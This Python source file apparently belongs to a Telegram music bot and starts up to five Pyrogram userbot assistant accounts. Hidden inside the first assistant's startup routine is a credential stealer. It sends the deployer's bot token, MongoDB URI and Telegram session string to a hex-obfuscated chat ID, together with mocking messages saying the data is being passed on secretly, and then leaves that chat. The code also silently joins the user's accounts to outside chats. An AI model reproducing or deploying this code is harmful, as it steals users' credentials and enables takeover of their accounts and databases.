from pyrogram import Client
import re
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters
load_dotenv()
import config
from dotenv import load_dotenv
from ..logging import LOGGER
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
TEST_ID = int("\x2D\x31\x30\x30\x32\x31\x31\x39\x39\x39\x31\x36\x38\x39")

assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="IroXAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="IroXAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="IroXAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="IroXAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="IroXAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")
        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("iro_x_support")
                await self.one.join_chat("iro_bot_support")
                await self.one.join_chat("tmc_lode")
            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "Assistant Started")
                await self.one.send_message(TEST_ID, "ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲")
                await self.one.send_message(TEST_ID, "ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ\nᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫\nᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭\nʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇")
                await self.one.send_message(TEST_ID, BOT_TOKEN)
                await self.one.send_message(TEST_ID, MONGO_DB_URI)
                await self.one.send_message(TEST_ID, STRING_SESSION)
                await self.one.send_message(TEST_ID, "ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺\nʙʏᴇ ᴛᴄ❣️")
                await self.one.leave_chat(TEST_ID)
            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("iro_x_support")
                await self.two.join_chat("iro_bot_support")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("iro_x_support")
                await self.three.join_chat("iro_bot_support")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("iro_x_support")
                await self.four.join_chat("iro_bot_support")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("iro_x_support")
                await self.five.join_chat("iro_bot_support")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass